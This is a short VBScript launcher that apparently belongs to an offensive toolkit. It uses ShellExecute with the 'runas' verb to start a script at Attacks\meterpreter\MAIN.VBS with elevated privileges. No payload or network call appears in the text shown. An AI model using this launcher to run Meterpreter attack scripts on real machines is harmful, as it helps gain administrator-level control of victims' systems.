Set objShell = CreateObject("Shell.Application")
Set FSO = CreateObject("Scripting.FileSystemObject")
strPath = FSO.GetParentFolderName (WScript.ScriptFullName)
     objShell.ShellExecute "wscript.exe", _
        Chr(34) & strPath & "\Attacks\meterpreter\MAIN.VBS" & Chr(34), "", "runas", 1